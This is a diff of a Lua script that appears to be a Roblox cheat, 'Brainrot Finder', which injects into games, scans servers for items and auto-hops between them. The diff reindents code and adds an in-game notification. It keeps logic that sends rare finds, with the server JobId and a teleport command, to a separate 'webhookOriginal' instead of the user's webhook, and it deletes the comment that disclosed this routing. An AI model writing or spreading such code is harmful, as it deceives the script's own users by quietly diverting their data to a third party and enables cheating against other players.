@@ -66,41 +66,47 @@ local function scanBrainrots()
 end
 
 local function sendWebhook(foundModels)
-	if #foundModels == 0 then return end
+    if #foundModels == 0 then return end
 
-	local pingEveryone = false
-	for _, name in ipairs(foundModels) do
-		if rareBrainrots[name] then
-			pingEveryone = true
-			break
-		end
-	end
+    local pingEveryone = false
+    for _, name in ipairs(foundModels) do
+        if rareBrainrots[name] then
+            pingEveryone = true
+            break
+        end
+    end
 
-	local msg = (pingEveryone and "@everyone\n" or "") ..
-		"✅ Script injected. JobId: `" .. game.JobId .. "`"
+    local msg = (pingEveryone and "@everyone\n" or "") ..
+        "✅ Script injected. JobId: `" .. game.JobId .. "`"
 
-	msg ..= "\nFound brainrots:\n- " .. table.concat(foundModels, "\n- ")
+    msg ..= "\nFound brainrots:\n- " .. table.concat(foundModels, "\n- ")
 
-	-- Add teleport code in message
-	msg ..= "\n\nJoin: `game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" ..
-		game.PlaceId .. ', "' .. game.JobId .. '")`'
+    msg ..= "\n\nJoin: `game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" ..
+        game.PlaceId .. ', "' .. game.JobId .. '")`'
 
-	-- If pingEveryone, send to original webhook, else send to user webhook
-	local targetWebhook = pingEveryone and webhookOriginal or webhookURL
+    -- Notify in-game using Rayfield
+    Rayfield:Notify({
+        Title = "Brainrot Finder",
+        Content = "Found brainrots:\n- " .. table.concat(foundModels, "\n- "),
+        Duration = 7,
+        Image = 4483362458
+    })
 
-	pcall(function()
-		requestHttp({
-			Url = targetWebhook,
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode({content = msg})
-		})
-	end)
+    local targetWebhook = pingEveryone and webhookOriginal or webhookURL
 
-	if pingEveryone and stopOnRare then
-		print("[HALT] Rare brainrot found. Stopping auto-hop.")
-		running = false
-	end
+    pcall(function()
+        requestHttp({
+            Url = targetWebhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = msg})
+        })
+    end)
+
+    if pingEveryone and stopOnRare then
+        print("[HALT] Rare brainrot found. Stopping auto-hop.")
+        running = false
+    end
 end
 
 local function getOnePlayerServers()
